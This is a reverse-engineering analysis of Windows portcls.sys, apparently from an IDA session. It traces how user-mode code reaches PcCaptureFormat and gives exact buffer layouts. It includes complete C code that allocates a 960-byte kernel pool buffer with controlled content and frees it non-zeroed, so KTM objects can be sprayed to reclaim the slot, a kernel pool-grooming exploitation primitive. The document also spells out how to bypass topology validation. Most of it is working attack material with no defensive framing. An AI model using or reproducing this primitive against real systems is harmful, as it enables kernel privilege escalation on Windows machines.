# portcls.sys - PcCaptureFormat User-Mode Trigger Analysis
## Target

- **Binary**: portcls.sys (MD5: f5327b8b8c86a3341f68c645993d422a)
- **IDA Base**: 0x1C0000000
- **PID**: 11184, **Port**: 13338
- **Function**: PcCaptureFormat at RVA 0x340F0 (absolute 0x1C00340F0)
- **Goal**: Trigger a 960-byte NonPagedPoolNx allocation (tag PcDf) with controlled content, then free it non-zeroed so a KTM object can reclaim the slot.

---

## 1. PcCaptureFormat Decompilation (RVA 0x340F0)

### Prototype

 `c
__int64 __fastcall PcCaptureFormat(
    void **out_format_ptr,     // a1 - stores allocated buffer pointer
    void *in_data_format,      // a2 - pointer to KSDATAFORMAT
    unsigned int in_buf_size,  // a3 - size of input buffer (= DataFormat->Size)
    void *topology_ctx,        // a4 - miniport topology context
    unsigned int pin_id,       // a5 - pin ID
    char align_flag            // a6 - alignment flag (1 from Init, 0 from PinPropertyDataFormat)
);
 `

### Entry Validation

- 0x1C0034119: if (a3 < 4) return STATUS_INVALID_PARAMETER (0xC000000D)
- 0x1C0034122: if (*(DWORD*)a2 > a3) return STATUS_INVALID_PARAMETER (0xC0000023)
- 0x1C0034131: result = ValidateDataFormat(a2)
- 0x1C003413A: if (result < 0) return result

### Path 1 - AUDIO/PCM, Non-Zeroed (alloc = Size - 8)

**Conditions** (all must be true):
- DataFormat->Size >= 0x5A (90 bytes)
- MajorFormat == KSDATAFORMAT_TYPE_AUDIO {73647561-0000-0010-8000-00AA00389B71}
- SubFormat == KSDATAFORMAT_SUBTYPE_PCM {518590A2-A184-11D0-8522-00C04FD9BAF3}
- Specifier == KSDATAFORMAT_SPECIFIER_WAVEFORMATEX {05589F81-C356-11CE-BF01-00AA0055595A}
- (*(BYTE*)(a2 + 64) & 8) == 0 -- low byte of wFormatTag. WAVE_FORMAT_PCM (0x0001) passes; WAVE_FORMAT_EXTENSIBLE (0xFFFE) fails.
- Topology validation must pass (KSNODETYPE_VOLUME, MUTE, AGC, LOUDNESS).

**Allocation**: ExAllocatePoolWithTag(NonPagedPoolNx (0x200), Size-8, 'PcDf' (0x66446350))
**Copy**: 4x OWORD copy (64 bytes) + memmove for rest. No memset(0). Size overwritten to Size-8. Specifier overwritten to WAVEFORMATEX. Flags &= ~2.

### Path 2 - Non-Audio, Zeroed Then Overwritten (alloc = Size)

**Conditions**:
- NOT (AUDIO + PCM + WAVEFORMATEX + Size >= 0x5A) -- any non-audio MajorFormat
- DataFormat->Size >= 0x40 (64 bytes)
- If a6==1 AND Flags&2: size aligned up to 8 bytes + extra DWORD

**Allocation**: ExAllocatePoolWithTag(NonPagedPoolNx (0x200), Size, 'PcDf')
**Copy**: memset(0) then memmove(input, Size). Buffer is zeroed first, then format data copied over.

### Post-Copy WAVEFORMATEX Fixup (both paths)
- If Size >= 0x52 && MajorFormat==AUDIO && Specifier==WAVEFORMATEX && SampleSize==0
- out->SampleSize = *(WORD*)(out+76) = WAVEFORMATEX.nBlockAlign
---

## 2. Xrefs to PcCaptureFormat (9 callers)

| Caller | RVA | Context |
|--------|-----|---------|
| CPortPinWaveRT::Init | 0x32490 | Pin creation (WaveRT) -- a6=1 |
| CPortPinDMus::Init | 0x47600 | Pin creation (DMus) -- a6=1 |
| PinPropertyDataFormat (DMus) | 0x47F30 | KSPROPERTY_PIN_DATAFORMAT SET -- a6=0 |
| CPortPinWaveCyclic::Init | 0x4BEF0 | Pin creation (WaveCyclic) -- a6=1 |
| PinPropertyDataFormat (WaveCyclic) | 0x4C580 | KSPROPERTY_PIN_DATAFORMAT SET -- a6=0 |
| CPortPinWavePci::Init | 0x50190 | Pin creation (WavePci) -- a6=1 |
| PinPropertyDataFormat_0 (WavePci) | 0x50970 | KSPROPERTY_PIN_DATAFORMAT SET -- a6=0 |
| PinPropertyDataFormat_1 (Topology) | 0x53AC0 | KSPROPERTY_PIN_DATAFORMAT SET -- a6=0 |
| Data ref at 0x2C490 | -- | Property table entry |

---

## 3. Caller Chain - Pin Creation Path

User Mode: KsCreatePin(hFilter, &KSPIN_CONNECT, &hPin)
  -> Kernel: IRP_MJ_CREATE on filter device
  -> PcDispatchIrp (RVA 0x353E0) -> KsDispatchIrp (ks.sys)
  -> CPortFilterWaveRT::NewIrpTarget (RVA 0x32010)
     1. KsValidateConnectRequest(Irp, pin_descriptor, &Connect) -- validates KSPIN_CONNECT
     2. ValidateDataFormat(&Connect[1]) -- validates KSDATAFORMAT following KSPIN_CONNECT
     3. CreatePortPinWaveRT(&pin_obj, ...) (RVA 0x32280) -- allocates CPortPinWaveRT (0x1D8 bytes, tag 'PcCr')
     4. pin->Init(port, filter, Connect, descriptor, device, irp)
  -> CPortPinWaveRT::Init (RVA 0x32490)
     0x1C00324FF: if (Connect->PinToHandle != 0) -> fail
     0x1C003258F: this->PinId = Connect->PinId
     0x1C0032662: PcCaptureFormat(&this->format_ptr, &Connect[1], Connect[1].FormatSize, miniport->topology, this->PinId, 1)
  -> PcCaptureFormat (RVA 0x340F0) -- allocates NonPagedPoolNx buffer, copies format data

### Alternative Path - Property SET on Existing Pin

User Mode: DeviceIoControl(hPin, IOCTL_KS_PROPERTY, KSPROPERTY_PIN_DATAFORMAT_SET, ...)
  -> KsDispatchIrp -> KsPropertyHandler -> PinPropertyDataFormat (RVA 0x47F30)
     if SET: PcCaptureFormat(&new, input, size, ctx, pin_id, 0)  // a6=0
     if success: ExFreePoolWithTag(old_format, 0) -- FREE OLD FORMAT (non-zeroed)
     pin->format_ptr = new_format

Useful for controlled free timing: create pin with any valid format, then SET a 960-byte format to allocate new buffer and free old one.

---

## 4. KSPIN_CONNECT Structure (x64, 72 bytes = 0x48)

| Offset | Type | Field | Value |
|--------|------|-------|-------|
| 0x00 | GUID | Interface.Set | KSINTERFACESETID_Standard {8C1349E1-7C5D-11D0-A47D-00A0C9255AC1} |
| 0x10 | ULONG | Interface.Id | 1 (KSINTERFACE_STANDARD_STREAMING) |
| 0x14 | ULONG | Interface.Flags | 0 |
| 0x18 | GUID | Medium.Set | KSMEDIUMSETID_Standard {8C1349E1-7C5D-11D0-A47D-00A0C9255AC1} |
| 0x28 | ULONG | Medium.Id | 0 |
| 0x2C | ULONG | Medium.Flags | 0 |
| 0x30 | ULONG | PinId | 0 (query pin factory for valid ID) |
| 0x34 | ULONG | (padding) | 0 |
| 0x38 | HANDLE | PinToHandle | NULL (0) -- required for creation |
| 0x40 | ULONG | Priority.PriorityClass | 1 (KSPRIORITY_NORMAL) |
| 0x44 | ULONG | Priority.PrioritySubClass | 0 |

KSDATAFORMAT follows immediately at offset 0x48.

### How to Create from User Mode

KsCreatePin from ksuser.lib (link with ksuser.lib, include ksmedia.h):
  HRESULT hr = KsCreatePin(hFilter, &connect, GENERIC_READ | GENERIC_WRITE, &hPin);

Internally calls NtCreateFile on filter device with KSPIN_CONNECT as EA buffer, generating IRP_MJ_CREATE. ks.sys KsDispatchIrp intercepts and dispatches to filter NewIrpTarget handler.
---

## 5. Device Name - How to Find the KS Audio Filter

portcls.sys registers device interfaces under KSCATEGORY_AUDIO:
**KSCATEGORY_AUDIO** = {6994AD04-93EF-11D0-A3CC-00A0C9223196}
Found at 7 locations in portcls.sys (RVA 0x1F270, 0x22708, 0x29090, 0x29318, 0x29348, 0x29398, 0x293E0).

### User-Mode Device Enumeration

Method 1: SetupDiGetClassDevs with KSCATEGORY_AUDIO + DIGCF_DEVICEINTERFACE | DIGCF_PRESENT
  -> SetupDiEnumDeviceInterfaces -> SetupDiGetDeviceInterfaceDetailW
  -> pdd->DevicePath is the filter device path (PnP interface, NOT a fixed \\Device\\Audio string)
  -> CreateFileW(pdd->DevicePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL)

Method 2: KsOpenDefaultDevice(&KSCATEGORY_AUDIO, GENERIC_READ | GENERIC_WRITE, KsObjTypeFilter) from ksuser.lib

---

## 6. KSDATAFORMAT Layout (64-byte header + format-specific data)

| Offset | Type | Field | Description |
|--------|------|-------|-------------|
| 0x00 | ULONG | FormatSize | Total size of KSDATAFORMAT (header + format data) |
| 0x04 | ULONG | Flags | 0 = no flags (avoid bit 1 for Path 2 simplicity) |
| 0x08 | ULONG | SampleSize | 0 (filled in post-copy for AUDIO+WAVEFORMATEX) |
| 0x0C | ULONG | Reserved | 0 |
| 0x10 | GUID | MajorFormat | Format type |
| 0x20 | GUID | SubFormat | Subtype |
| 0x30 | GUID | Specifier | Format specifier |
| 0x40 | ... | Format-specific data | WAVEFORMATEX, WAVEFORMATEXTENSIBLE, or custom |

### GUID Values

| Constant | GUID | Raw Bytes (LE) |
|----------|------|----------------|
| KSDATAFORMAT_TYPE_AUDIO | {73647561-0000-0010-8000-00AA00389B71} | 6175647300001000800000aa00389b71 |
| KSDATAFORMAT_SUBTYPE_PCM | {518590A2-A184-11D0-8522-00C04FD9BAF3} | a290855184a1d011852200c04fd9baf3 |
| KSDATAFORMAT_SPECIFIER_WAVEFORMATEX | {05589F81-C356-11CE-BF01-00AA0055595A} | 819f580556c3ce11bf0100aa0055595a |
| KSINTERFACESETID_Standard | {8C1349E1-7C5D-11D0-A47D-00A0C9255AC1} | e149138c5d7cd011a47d00a0c9255ac1 |
| KSCATEGORY_AUDIO | {6994AD04-93EF-11D0-A3CC-00A0C9223196} | 04ad9469ef93d011a3cc00a0c9223196 |

---

## 7. Path 1 - 960-byte Non-Zeroed Allocation (AUDIO/PCM)

FormatSize = 968 (0x3C8) -> allocation = 968 - 8 = **960 bytes (0x3C0)**

Requirements:
- Valid audio adapter with topology containing KSNODETYPE_VOLUME, KSNODETYPE_MUTE, or other recognized transform nodes
- wFormatTag low byte at offset 64 must have bit 3 clear (WAVE_FORMAT_PCM = 0x0001 passes)
- ValidateDataFormat checks: FormatSize >= 82 + WAVEFORMATEX.cbSize (for AUDIO + WAVEFORMATEX specifier)
- Topology validation walks KSTOPOLOGY_CONNECTION from the pin through transform nodes
- Topology validation bypass: Not practical without a matching topology. Use Path 2 instead.

---

## 8. Path 2 - 960-byte Zeroed-Then-Overwritten Allocation (Any Non-Audio Format)

FormatSize = 960 (0x3C0) -> allocation = **960 bytes (0x3C0)**

KSDATAFORMAT (960 bytes):
- 0x00: C0 03 00 00 = FormatSize = 960
- 0x04: 00 00 00 00 = Flags = 0
- 0x08-0x0F: zeros = SampleSize, Reserved
- 0x10-0x1F: NULL GUID = MajorFormat (NOT AUDIO -> triggers Path 2)
- 0x20-0x2F: NULL GUID = SubFormat
- 0x30-0x3F: NULL GUID = Specifier
- 0x40-0x3BF: Controlled content (896 bytes)

ValidateDataFormat for non-AUDIO MajorFormat: returns 0 (success) immediately.
Content after copy: memset(0) then memmove(input, 960). All 960 bytes controlled. At free time, controlled data remains (ExFreePoolWithTag does not zero).
Flags and 2: If set (from Init path, a6=1), allocation size aligned up to 8 + extra DWORD. Keep Flags=0 for exactly 960 bytes.

---

## 9. Non-Audio Format to Bypass Topology Validation

Any MajorFormat GUID that is NOT KSDATAFORMAT_TYPE_AUDIO triggers Path 2. Options:
1. NULL GUID {00000000-0000-0000-0000-000000000000} -- simplest
2. KSDATAFORMAT_TYPE_VIDEO {73646976-0000-0010-8000-00AA00389B71}
3. Custom GUID -- any random GUID

ValidateDataFormat (RVA 0x1420) only validates formats where MajorFormat == AUDIO. For non-AUDIO, returns 0 immediately.
AUDIO but non-PCM/non-WAVEFORMATEX also works: ValidateDataFormat returns 0, PcCaptureFormat goes to Path 2.

---

## 10. Format Buffer Free - Triggering the Non-Zeroed Free

### Destructor Path (~CPortPinWaveRT, RVA 0x32E70)

ExFreePoolWithTag(format_buffer, 0) -- tag 0 = match any tag. Buffer allocated with 'PcDf' but freed with tag 0. No zeroing. Pool slot retains format data content.

### Close Path (CPortPinWaveRT::Close, RVA 0x33630)

IRP_MJ_CLOSE (CloseHandle(hPin)). Does stream cleanup, buffer unmap, event release. Does NOT directly free format buffer. Format buffer freed when destructor runs (refcount -> 0).

### PinPropertyDataFormat SET Free

ExFreePoolWithTag(old_format, 0) -- frees old format immediately when new format is set. Useful for controlled free timing without closing pin.

### Free Flow Summary

CloseHandle(hPin) -> IRP_MJ_CLOSE -> CPortPinWaveRT::Close -> refcount -> 0 -> ~CPortPinWaveRT -> ExFreePoolWithTag(format_buffer, 0) -- 960 bytes, tag 'PcDf', NON-ZEROED -> pool slot available for KTM reclaim

Format buffer IS freed even if pin creation partially fails. If PcCaptureFormat succeeds but NewStream fails, error path releases pin object, triggering destructor. User never gets handle, free happens synchronously during KsCreatePin.

---

## 11. Virtual Audio Device (No Physical Hardware)

Option A: System Default Audio -- Windows 10/11 with HD Audio or USB audio already have portcls pins.
Option B: Virtual Audio Adapter -- Install VB-Cable, Virtual Audio Cable, or custom WDM audio driver with KSCATEGORY_AUDIO.
Option C: NULL/Custom Format -- Path 2 bypasses topology validation entirely. Pin creation may fail at NewStream but PcCaptureFormat has already allocated the 960-byte buffer, and destructor will free it.

---

## 12. Non-Audio Format to Avoid Topology Validation

Using non-AUDIO MajorFormat avoids ALL topology validation:
1. ValidateDataFormat returns 0 immediately for non-AUDIO
2. PcCaptureFormat skips AUDIO/PCM/WAVEFORMATEX branch entirely
3. No FindConnectionToPin, NodeIsTransform, or IsEqualGUIDAligned calls
4. No topology GUID checks (KSNODETYPE_VOLUME, MUTE, AGC, LOUDNESS)

Tradeoff: buffer is memset(0) before format data copied (Path 2). Since ExFreePoolWithTag does not zero on free, content at free time is the copied format data -- fully controlled.
---

## 13. Exact Byte Layout - KSPIN_CONNECT + KSDATAFORMAT

### Path 2 Full Input Buffer (1032 bytes = 0x408)

`
=== KSPIN_CONNECT (72 bytes = 0x48) ===
0000: E1 49 13 8C 5D 7C D0 11 A4 7D 00 A0 C9 25 5A C1  Interface.Set
0010: 01 00 00 00 00 00 00 00                          Interface.Id=1, Flags=0
0018: E1 49 13 8C 5D 7C D0 11 A4 7D 00 A0 C9 25 5A C1  Medium.Set
0028: 00 00 00 00 00 00 00 00                          Medium.Id=0, Flags=0
0030: 00 00 00 00                                      PinId = 0
0034: 00 00 00 00                                      (padding)
0038: 00 00 00 00 00 00 00 00                          PinToHandle = NULL
0040: 01 00 00 00 00 00 00 00                          Priority=1,0

=== KSDATAFORMAT (960 bytes = 0x3C0) ===
0048: C0 03 00 00                                      FormatSize = 960
004C: 00 00 00 00                                      Flags = 0
0050: 00 00 00 00                                      SampleSize = 0
0054: 00 00 00 00                                      Reserved = 0
0058: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  MajorFormat = NULL
0068: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  SubFormat = NULL
0078: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  Specifier = NULL
0088: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  Format data (controlled)
...  (896 bytes of controlled content, offsets 0x88-0x407)
`

### Path 1 Full Input Buffer (1040 bytes = 0x410)

`
=== KSPIN_CONNECT (72 bytes = 0x48) ===
0000: E1 49 13 8C 5D 7C D0 11 A4 7D 00 A0 C9 25 5A C1  Interface.Set
0010: 01 00 00 00 00 00 00 00                          Interface.Id=1, Flags=0
0018: E1 49 13 8C 5D 7C D0 11 A4 7D 00 A0 C9 25 5A C1  Medium.Set
0028: 00 00 00 00 00 00 00 00                          Medium.Id=0, Flags=0
0030: 00 00 00 00                                      PinId = 0
0034: 00 00 00 00                                      (padding)
0038: 00 00 00 00 00 00 00 00                          PinToHandle = NULL
0040: 01 00 00 00 00 00 00 00                          Priority=1,0

=== KSDATAFORMAT (968 bytes = 0x3C8) ===
0048: C8 03 00 00                                      FormatSize = 968
004C: 00 00 00 00                                      Flags = 0
0050: 00 00 00 00                                      SampleSize = 0
0054: 00 00 00 00                                      Reserved = 0
0058: 61 75 64 73 00 00 10 00 80 00 00 AA 00 38 9B 71  MajorFormat = AUDIO
0068: A2 90 85 51 84 A1 D0 11 85 22 00 C0 4F D9 BA F3  SubFormat = PCM
0078: 81 9F 58 05 56 C3 CE 11 BF 01 00 AA 00 55 59 5A  Specifier = WAVEFORMATEX
0088: 01 00 01 00 44 AC 00 00 88 58 01 00 04 00 10 00  WAVEFORMATEX: PCM, 1ch, 44100Hz
...  (904 bytes of controlled content, offsets 0x88-0x40F)
`

---

## Complete User-Mode API Call Sequence

### Path 2 (Recommended -- No Topology Validation, 960-byte alloc)

```c
#include <windows.h>
#include <ks.h>
#include <ksmedia.h>
#include <setupapi.h>
#include <initguid.h>

#pragma comment(lib, "ksuser.lib")
#pragma comment(lib, "setupapi.lib")

void TriggerPcCaptureFormat_960(void)
{
    // Step 1: Find KS audio filter device
    GUID category = KSCATEGORY_AUDIO;
    HDEVINFO hDevInfo = SetupDiGetClassDevs(&category, NULL, NULL,
        DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);
    SP_DEVICE_INTERFACE_DATA did = { sizeof(did) };
    SetupDiEnumDeviceInterfaces(hDevInfo, NULL, &category, 0, &did);

    DWORD needed = 0;
    SetupDiGetDeviceInterfaceDetail(hDevInfo, &did, NULL, 0, &needed, NULL);
    PSP_DEVICE_INTERFACE_DETAIL_DATA_W pdd = malloc(needed);
    pdd->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);
    SetupDiGetDeviceInterfaceDetailW(hDevInfo, &did, pdd, needed, NULL, NULL);

    // Step 2: Open filter device handle
    HANDLE hFilter = CreateFileW(pdd->DevicePath,
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    free(pdd);
    SetupDiDestroyDeviceInfoList(hDevInfo);
    if (hFilter == INVALID_HANDLE_VALUE) return;

    // Step 3: Construct KSPIN_CONNECT + KSDATAFORMAT (1032 bytes)
    unsigned char buf[1032];
    memset(buf, 0, sizeof(buf));

    // KSPIN_CONNECT.Interface.Set = KSINTERFACESETID_Standard
    static const BYTE ksif_guid[16] = {
        0xE1,0x49,0x13,0x8C, 0x5D,0x7C, 0xD0,0x11,
        0xA4,0x7D, 0x00,0xA0,0xC9,0x25,0x5A,0xC1
    };
    memcpy(buf + 0x00, ksif_guid, 16);
    *(DWORD*)(buf + 0x10) = 1;  // Interface.Id = STANDARD_STREAMING
    memcpy(buf + 0x18, ksif_guid, 16);  // Medium.Set
    *(DWORD*)(buf + 0x40) = 1;  // Priority.Class = NORMAL

    // KSDATAFORMAT at offset 0x48
    *(DWORD*)(buf + 0x48) = 960;  // FormatSize = 0x3C0
    // MajorFormat = NULL GUID (already zeroed) -> triggers Path 2
    // SubFormat, Specifier = NULL GUID (already zeroed)
    memset(buf + 0x88, 0x42, 896);  // Controlled format data

    // Step 4: Create pin via KsCreatePin
    KSPIN_CONNECT *connect = (KSPIN_CONNECT*)buf;
    HANDLE hPin = NULL;
    HRESULT hr = KsCreatePin(hFilter, connect,
        GENERIC_READ | GENERIC_WRITE, &hPin);

    // PcCaptureFormat has now allocated 960 bytes in NonPagedPoolNx with tag PcDf.
    // If hPin is valid, pin was created. If failed, format buffer was freed during cleanup.

    // Step 5: Free the format buffer (non-zeroed) for KTM reclaim
    if (hPin && hPin != INVALID_HANDLE_VALUE) {
        CloseHandle(hPin);  // Triggers ~CPortPinWaveRT -> ExFreePoolWithTag(fmt, 0)
        // 960-byte NonPagedPoolNx slot now free with controlled content intact
    }

    // Step 6: Spray KTM objects of size 960 to reclaim the freed slot
    // (KTM transaction manager objects, TmRx objects, etc.)

    CloseHandle(hFilter);
}
```

### Alternative: PinPropertyDataFormat SET Path (Controlled Free Timing)

```c
// Step 1-2: Same as above -- find device, open filter
// Step 3: Create pin with a VALID small audio format first
//   (use real PCM WAVEFORMATEX so NewStream succeeds and hPin is valid)
// Step 4: Construct KSPROPERTY_PIN_DATAFORMAT SET request with 960-byte NULL format
//   DeviceIoControl(hPin, IOCTL_KS_PROPERTY, &ksprop, sizeof(ksprop),
//                   buf_960_null_format, 960, &returned, NULL);
//   -> PinPropertyDataFormat -> PcCaptureFormat allocates 960 bytes
//   -> ExFreePoolWithTag(old_format, 0) frees the ORIGINAL format (non-zeroed)
// Step 5: CloseHandle(hPin) -> destructor frees the 960-byte buffer (non-zeroed)
// Step 6: Spray KTM objects to reclaim
```

---

## Summary

| Item | Path 1 (Non-Zeroed) | Path 2 (Zeroed+Copied) |
|------|---------------------|------------------------|
| FormatSize | 968 (0x3C8) | 960 (0x3C0) |
| Allocation | 960 (0x3C0) | 960 (0x3C0) |
| Pool | NonPagedPoolNx (0x200) | NonPagedPoolNx (0x200) |
| Tag | PcDf (0x66446350) | PcDf (0x66446350) |
| MajorFormat | AUDIO | NULL/custom |
| Topology check | Required | Bypassed |
| ValidateDataFormat | AUDIO-specific checks | Trivial pass |
| Content at free | Controlled (direct copy) | Controlled (zeroed then copied) |
| Free function | ExFreePoolWithTag(fmt, 0) | ExFreePoolWithTag(fmt, 0) |
| Zeroed on free | No | No |
| Trigger | KsCreatePin or KSPROPERTY_PIN_DATAFORMAT SET | Same |

Both paths produce a 960-byte NonPagedPoolNx allocation with tag PcDf and controlled content, freed non-zeroed via ExFreePoolWithTag(fmt, 0) when the pin is destroyed. The freed slot is immediately available for KTM object reclaim.
